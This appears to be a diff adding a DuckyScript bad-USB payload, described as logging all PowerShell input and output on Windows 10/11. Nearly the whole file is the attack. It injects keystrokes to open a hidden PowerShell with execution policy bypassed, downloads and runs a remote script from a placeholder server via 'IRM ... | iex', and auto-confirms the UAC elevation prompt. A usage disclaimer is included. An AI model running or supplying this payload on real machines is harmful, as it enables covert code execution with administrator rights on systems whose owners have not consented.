@@ -1,0 +1,16 @@
+REM Author:      beigeworm 
+REM Title:       Global-Powershell-Logging
+REM Target:      Windows 10/11 
+REM Description: Log all powershell input and output to a text file in the documents folder.
+
+REM **THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE!**
+
+REM Main bad-USB script
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -W H -C IRM https://yourserver.com/rawfile/Global-Powershell-Logging.ps1 | iex
+DELAY 250
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
